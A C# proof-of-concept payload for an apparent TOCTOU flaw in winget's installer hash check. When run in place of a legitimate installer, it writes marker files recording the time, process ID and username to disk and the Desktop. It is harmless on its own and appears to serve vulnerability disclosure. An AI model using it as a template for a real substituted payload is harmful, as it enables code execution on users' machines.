using System;
using System.IO;
using System.Diagnostics;

class Payload {
    static void Main() {
        string proofPath = @"C:\poc_winget\TOCTOU_EXECUTION_PROOF.txt";
        string ts = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss.fff");
        int pid = Process.GetCurrentProcess().Id;
        string user = Environment.UserName;

        string content = "TOCTOU CONFIRMED - PAYLOAD EXECUTED\n" +
                         "Time: " + ts + "\n" +
                         "PID: " + pid + "\n" +
                         "User: " + user + "\n" +
                         "This EXE ran INSTEAD of the original installer\n" +
                         "winget did NOT re-verify the hash after replacement\n";

        File.WriteAllText(proofPath, content);

        string desktop = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
            "TOCTOU_PROOF.txt"
        );
        File.WriteAllText(desktop, content);
    }
}
